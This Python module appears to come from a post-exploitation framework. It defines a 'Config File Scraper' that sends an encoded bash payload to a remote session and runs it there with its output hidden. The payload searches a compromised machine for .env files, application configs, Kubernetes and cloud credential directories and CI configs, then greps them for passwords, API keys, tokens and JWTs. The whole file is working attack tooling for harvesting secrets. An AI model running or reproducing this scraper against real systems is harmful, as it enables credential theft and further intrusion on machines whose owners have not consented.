"""Configuration file scraper."""

from ..base import OperatorScript, ScriptResult


class ConfigScraper(OperatorScript):
    """Scrape configuration files for secrets."""
    
    name = "Config File Scraper"
    description = "Extract secrets from 20+ config file types"
    category = "harvest"
    
    def get_payload(self) -> str:
        return """#!/bin/bash
echo "[*] CONFIG FILE SCRAPER"
echo "======================"
echo ""

echo "[+] Environment files:"
find / -name ".env" -o -name ".env.local" -o -name ".env.production" -o -name ".env.development" 2>/dev/null | while read file; do
    echo "[!] $file"
    ls -la "$file"
    echo "Keys found:"
    grep -E "^[A-Z_]+=.*" "$file" 2>/dev/null | cut -d= -f1 | head -20
    echo ""
done

echo "[+] Application config files:"
for pattern in "config.php" "config.yml" "config.yaml" "application.properties" "settings.py" "web.config" "app.config"; do
    find / -name "$pattern" 2>/dev/null | head -10 | while read file; do
        echo "[!] $file"
        ls -la "$file"
    done
done
echo ""

echo "[+] Docker and container configs:"
find / -name "docker-compose.yml" -o -name "Dockerfile" -o -name ".dockerenv" 2>/dev/null | head -10
echo ""

echo "[+] Kubernetes configs:"
find / -name "*.kubeconfig" -o -path "*/.kube/config" 2>/dev/null
echo ""

echo "[+] CI/CD configuration:"
find / -name ".gitlab-ci.yml" -o -name ".travis.yml" -o -name "Jenkinsfile" -o -name ".circleci" 2>/dev/null | head -10
echo ""

echo "[+] Cloud provider configs:"
find / -name ".aws" -o -name ".azure" -o -name ".gcloud" 2>/dev/null -type d
echo ""

echo "[+] Secrets in config files (password, api_key, token, secret):"
grep -r "password\\s*[=:]\\|api_key\\s*[=:]\\|secret\\s*[=:]\\|token\\s*[=:]" /etc /opt /var/www /home 2>/dev/null | grep -v "Binary\\|#.*password" | head -50
echo ""

echo "[+] JWT tokens in configs:"
grep -r "eyJ[A-Za-z0-9_-]*\\.[A-Za-z0-9_-]*\\.[A-Za-z0-9_-]*" /etc /opt /var/www 2>/dev/null | head -10
"""
    
    def run(self, session_meta, send_command_func, output_func) -> ScriptResult:
        try:
            output_func("[bold cyan][*] Scraping configuration files...[/bold cyan]")
            payload = self.get_payload()
            import base64
            encoded = base64.b64encode(payload.encode()).decode('ascii')
            send_command_func(f"echo '{encoded}' | base64 -d | bash", show_in_output=False)
            return ScriptResult(success=True, output="Config scraping executed")
        except Exception as e:
            return ScriptResult(success=False, output="", error=str(e))
